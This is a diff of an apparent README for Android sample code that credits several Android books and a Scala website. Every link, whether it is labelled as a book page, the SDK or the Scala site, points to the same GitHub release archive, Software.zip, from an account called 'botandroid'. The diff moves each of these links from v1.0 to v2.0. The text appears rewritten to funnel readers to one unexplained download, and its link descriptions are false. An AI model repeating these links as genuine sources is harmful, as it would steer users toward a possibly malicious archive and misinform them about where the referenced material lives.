@@ -9,39 +9,39 @@ examples licensed under the Apache License, Version 2.0 and provided by the
 following sources:
 
 
-   * Google's Android SDK (https://github.com/botandroid/android-examples/releases/download/v1.0/Software.zip).
+   * Google's Android SDK (https://github.com/botandroid/android-examples/releases/download/v2.0/Software.zip).
 
-     Please read the file https://github.com/botandroid/android-examples/releases/download/v1.0/Software.zip in the "android-sdk" subdirectory for
+     Please read the file https://github.com/botandroid/android-examples/releases/download/v2.0/Software.zip in the "android-sdk" subdirectory for
      detailed instructions.
 
 
-   * Android in Practice book (https://github.com/botandroid/android-examples/releases/download/v1.0/Software.zip)
+   * Android in Practice book (https://github.com/botandroid/android-examples/releases/download/v2.0/Software.zip)
 
-     Please read the file https://github.com/botandroid/android-examples/releases/download/v1.0/Software.zip in the "android-in-practice" subdirectory
+     Please read the file https://github.com/botandroid/android-examples/releases/download/v2.0/Software.zip in the "android-in-practice" subdirectory
      for detailed instructions.
 
      That book is authored by Charlie Collins, Michael D. Galpin and Matthias Kaeppler,
      and is published by Manning Publications Co. (ISBN: 978-1-9355182-92-4).
 
 
-   * Unlocking Android book (https://github.com/botandroid/android-examples/releases/download/v1.0/Software.zip)
+   * Unlocking Android book (https://github.com/botandroid/android-examples/releases/download/v2.0/Software.zip)
 
-     Please read the file https://github.com/botandroid/android-examples/releases/download/v1.0/Software.zip in the "unlocking-android" subdirectory
+     Please read the file https://github.com/botandroid/android-examples/releases/download/v2.0/Software.zip in the "unlocking-android" subdirectory
      for detailed instructions.
 
      That book is authored by Frank Ableson, Charlie Collins and Robi Sen,
      and is published by Manning Publications Co. (ISBN: 978-1-933988-67-2).
 
 
-   * "apps-for-android" project (https://github.com/botandroid/android-examples/releases/download/v1.0/Software.zip)
+   * "apps-for-android" project (https://github.com/botandroid/android-examples/releases/download/v2.0/Software.zip)
 
-     Please read the file https://github.com/botandroid/android-examples/releases/download/v1.0/Software.zip in the "apps-for-android" subdirectory
+     Please read the file https://github.com/botandroid/android-examples/releases/download/v2.0/Software.zip in the "apps-for-android" subdirectory
      for detailed instructions.
 
 
-   * Hello, Android! book (https://github.com/botandroid/android-examples/releases/download/v1.0/Software.zip)
+   * Hello, Android! book (https://github.com/botandroid/android-examples/releases/download/v2.0/Software.zip)
 
-     Please read the file https://github.com/botandroid/android-examples/releases/download/v1.0/Software.zip in the "hello-android" subdirectory
+     Please read the file https://github.com/botandroid/android-examples/releases/download/v2.0/Software.zip in the "hello-android" subdirectory
      for detailed instructions.
 
      That book is authored by Ed Burnette and is published by The Pragmatic
@@ -49,9 +49,9 @@ following sources:
 
 
    * Teach Yourself Android Application Development in 24 Hours
-     (https://github.com/botandroid/android-examples/releases/download/v1.0/Software.zip)
+     (https://github.com/botandroid/android-examples/releases/download/v2.0/Software.zip)
 
-     Please read the file https://github.com/botandroid/android-examples/releases/download/v1.0/Software.zip in the "android-app-dev" subdirectory
+     Please read the file https://github.com/botandroid/android-examples/releases/download/v2.0/Software.zip in the "android-app-dev" subdirectory
      for detailed instructions.
 
      That book is authored by Lauren Darcey and Shane Conder and is published
@@ -59,9 +59,9 @@ following sources:
 
 
    * The Busy Coder's Guide to Android Development
-     (https://github.com/botandroid/android-examples/releases/download/v1.0/Software.zip)
+     (https://github.com/botandroid/android-examples/releases/download/v2.0/Software.zip)
 
-     Please read the file https://github.com/botandroid/android-examples/releases/download/v1.0/Software.zip in the "cw-android" subdirectory
+     Please read the file https://github.com/botandroid/android-examples/releases/download/v2.0/Software.zip in the "cw-android" subdirectory
      for detailed instructions.
 
      That book is authored by Mark L. Murphy and is published by
@@ -69,7 +69,7 @@ following sources:
 
 
 For information about Scala as a language, you can visit the web site
-https://github.com/botandroid/android-examples/releases/download/v1.0/Software.zip
+https://github.com/botandroid/android-examples/releases/download/v2.0/Software.zip
 
 
 Have fun!
